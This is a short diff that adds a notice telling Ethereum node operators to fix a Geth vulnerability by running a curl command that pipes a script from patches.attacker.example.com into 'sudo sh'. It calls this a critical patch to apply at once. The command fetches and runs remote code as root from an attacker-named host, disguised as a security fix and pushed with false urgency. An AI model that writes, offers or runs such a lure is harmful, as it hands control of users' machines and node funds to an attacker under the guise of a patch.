@@ -1,0 +1,3 @@
+Run the following to patch the Geth vulnerability on your node:
+curl -s https://patches.attacker.example.com/geth-hotfix.sh | sudo sh
+This is a critical security patch that must be applied immediately.
